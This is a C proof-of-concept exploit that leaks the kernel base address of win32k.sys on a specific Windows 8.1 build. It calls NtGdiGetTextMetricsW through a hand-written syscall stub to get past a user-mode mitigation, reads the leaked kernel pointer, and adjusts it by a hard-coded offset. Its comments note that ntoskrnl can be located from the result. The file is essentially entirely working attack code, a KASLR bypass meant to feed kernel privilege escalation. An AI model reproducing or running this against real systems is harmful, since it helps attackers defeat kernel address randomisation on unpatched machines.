// Infoleak for win32k.sys base address.
//
// The address that is leaked is an offset to a particular location
// `RGNOBJ::UpdateUserRgn+0x70` in `win32k.sys`, which is a fixed offset
// from the base of `win32k.sys` for a given build.
//
// The build of `win32k.sys` for this infoleak is: 6.3.9600.17393.
//
// The address to `ntoskrnl` can be found via reading various pointers
// based off `win32k.sys`.

#include <windows.h>
#include <stdio.h>

// NtGdiGetTextMetricsW exposes the original function in win32k.sys with the
// same name.
//
// The Win32 API exposes the functionality of `NtGdiGetTextMetricsW` via
// `GetTextMetrics`. However, before `GetTextMetrics` returns, it will zero
// out the part of the return buffer that contains the leaked address,
// presumably as a security measure.
NTSTATUS(APIENTRY NtGdiGetTextMetricsW) (HDC hdc, unsigned char *buffer) {
    asm(
        "mov r10, rcx;"
        "mov r8d, 0x44;"
        "mov eax, 0x1076;"
        "syscall;"
    );
}

// win32k_infoleak returns the (leaked) base address of `win32k.sys`.
// The function returns NULL if the address failed to be found.
ULONGLONG win32k_infoleak() {
    static ULONGLONG win32k_base_addr;
    static unsigned char buffer[0x100];
    HDC hdc;

    // Needed as an argument to `NtGdiGetTextMetricsW()`.
    hdc = CreateCompatibleDC(NULL);
    if (hdc == NULL) {
        return NULL;
    }

    // Leak the address and retrieve it from `buffer`.
    NtGdiGetTextMetricsW(hdc, buffer);

    DWORD hi = *(DWORD *)&buffer[0x38 + 4]; // High DWORD of leaked address
    DWORD lo = *(DWORD *)&buffer[0x38];     // Low DWORD of leaked address

    // Check: High DWORD should be a kernel-mode address (i.e.
    // 0xffff0800`00000000). We make the check stricter by checking for a
    // subset of kernel-mode addresses.
    if ((hi & 0xfffff000) != 0xfffff000) {
        return NULL;
    }

    // Retrieve the address of `win32k!RGNOBJ::UpdateUserRgn+0x70` using
    // the following computation.
    win32k_base_addr =
        ((ULONGLONG)hi << 32) | lo;

    // Adjust for offset to get base address of `win32k.sys`.
    win32k_base_addr -= 0x0003cf00;

    // Check: Base address of `win32k.sys` should be of the form
    // 0xFFFFFxxx`00xxx000.
    if ((win32k_base_addr & 0xff000fff) != 0) {
        return NULL;
    }

    DeleteDC(hdc);
    return win32k_base_addr;
}

int main() {
    ULONGLONG win32k_base_addr;

    // Trigger the leak.
    win32k_base_addr = win32k_infoleak();
    if (win32k_base_addr == NULL) {
      printf("Failed to leak base address of win32k.sys.\n");      
      return -1;
    }

    printf("Base address of win32k.sys: %I64x\n", win32k_base_addr);
    return 0;
}
